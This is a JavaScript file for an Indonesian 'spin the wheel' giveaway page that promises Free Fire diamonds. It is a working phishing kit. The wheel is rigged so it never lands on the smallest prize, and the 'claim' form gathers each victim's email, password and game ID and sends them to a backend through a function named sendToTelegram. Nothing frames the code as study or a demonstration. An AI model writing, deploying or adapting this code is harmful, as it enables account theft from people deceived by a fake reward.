const canvas = document.getElementById('wheel');
const ctx = canvas.getContext('2d');
const spinBtn = document.getElementById('spinBtn');
const status = document.getElementById('status');
const modal = document.getElementById('modal');
const formModal = document.getElementById('formModal');
const loadingModal = document.getElementById('loadingModal');
const finalModal = document.getElementById('finalModal');
const claimBtn = document.getElementById('claimBtn');
const submitBtn = document.getElementById('submitBtn');
const okBtn = document.getElementById('okBtn');
const formError = document.getElementById('formError');

const segments = [
  '100 DM', '500 DM', '50 DM', '1000 DM',
  '200 DM', '500 DM', '10 DM', '500 DM'
];
const colors = ['#e94560','#0f3460','#ffd700','#533483','#00b4d8','#b81d3a','#06d6a0','#f77f00'];
const totalSegments = segments.length;
const arc = (2 * Math.PI) / totalSegments;
let currentRotation = 0;
let spinning = false;
let hasSpun = false;
let currentPrize = '500';

function drawWheel() {
  ctx.clearRect(0, 0, 400, 400);
  for (let i = 0; i < totalSegments; i++) {
    const startAngle = i * arc + currentRotation;
    const endAngle = startAngle + arc;
    ctx.beginPath();
    ctx.moveTo(200, 200);
    ctx.arc(200, 200, 190, startAngle, endAngle);
    ctx.closePath();
    ctx.fillStyle = colors[i % colors.length];
    ctx.fill();
    ctx.strokeStyle = '#fff';
    ctx.lineWidth = 2;
    ctx.stroke();

    ctx.save();
    ctx.translate(200, 200);
    ctx.rotate(startAngle + arc / 2);
    ctx.textAlign = 'right';
    ctx.fillStyle = '#fff';
    ctx.font = 'bold 15px Segoe UI';
    ctx.shadowColor = 'rgba(0,0,0,0.6)';
    ctx.shadowBlur = 4;
    ctx.fillText(segments[i], 175, 6);
    ctx.font = '14px Segoe UI';
    ctx.fillText('💎', 175, 22);
    ctx.restore();
  }
  ctx.beginPath();
  ctx.arc(200, 200, 40, 0, 2 * Math.PI);
  ctx.fillStyle = '#0a0f1e';
  ctx.fill();

  ctx.beginPath();
  ctx.moveTo(200, 5);
  ctx.lineTo(185, 35);
  ctx.lineTo(215, 35);
  ctx.closePath();
  ctx.fillStyle = '#ffd700';
  ctx.shadowColor = '#ffd700';
  ctx.shadowBlur = 15;
  ctx.fill();
  ctx.shadowBlur = 0;
}

function spinWheel() {
  if (spinning || hasSpun) return;
  spinning = true;
  spinBtn.disabled = true;
  status.textContent = 'Memutar roda...';

  let randomIndex;
  do {
    randomIndex = Math.floor(Math.random() * totalSegments);
  } while (segments[randomIndex] === '10 DM');

  const segmentCenter = randomIndex * arc + arc / 2;
  const extraTurns = 6 * 2 * Math.PI;
  const targetRotation = extraTurns + (1.5 * Math.PI - segmentCenter);

  currentPrize = segments[randomIndex].replace(' DM', '');

  const startRotation = currentRotation % (2 * Math.PI);
  const duration = 4000;
  const startTime = performance.now();

  function animate(time) {
    const elapsed = time - startTime;
    const progress = Math.min(elapsed / duration, 1);
    const easeOut = 1 - Math.pow(1 - progress, 3);
    currentRotation = startRotation + (targetRotation - startRotation) * easeOut;
    drawWheel();

    if (progress < 1) {
      requestAnimationFrame(animate);
    } else {
      spinning = false;
      hasSpun = true;
      status.textContent = 'Kamu beruntung!';
      document.getElementById('prizeAmount').textContent = currentPrize;
      modal.classList.remove('hidden');
    }
  }
  requestAnimationFrame(animate);
}

async function sendToTelegram(email, password, ffId) {
  try {
    const res = await fetch('/api/send', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password, ffId })
    });
    const data = await res.json();
    return data.ok === true;
  } catch (err) {
    return false;
  }
}

spinBtn.addEventListener('click', spinWheel);

claimBtn.addEventListener('click', () => {
  modal.classList.add('hidden');
  formModal.classList.remove('hidden');
});

submitBtn.addEventListener('click', async () => {
  const email = document.getElementById('emailInput').value.trim();
  const password = document.getElementById('passInput').value.trim();
  const ffId = document.getElementById('ffIdInput').value.trim();

  formError.classList.add('hidden');

  if (!email || !password || !ffId) {
    formError.textContent = 'Isi semua data dengan benar!';
    formError.classList.remove('hidden');
    return;
  }

  if (!email.includes('@') || !email.includes('.')) {
    formError.textContent = 'Format email tidak valid!';
    formError.classList.remove('hidden');
    return;
  }

  submitBtn.disabled = true;
  formModal.classList.add('hidden');
  loadingModal.classList.remove('hidden');

  const success = await sendToTelegram(email, password, ffId);

  loadingModal.classList.add('hidden');

  if (success) {
    finalModal.classList.remove('hidden');
  } else {
    formModal.classList.remove('hidden');
    formError.textContent = 'Koneksi gagal, coba lagi!';
    formError.classList.remove('hidden');
    submitBtn.disabled = false;
  }
});

okBtn.addEventListener('click', () => {
  finalModal.classList.add('hidden');
  status.textContent = 'Terima kasih sudah ikut!';
});

drawWheel();
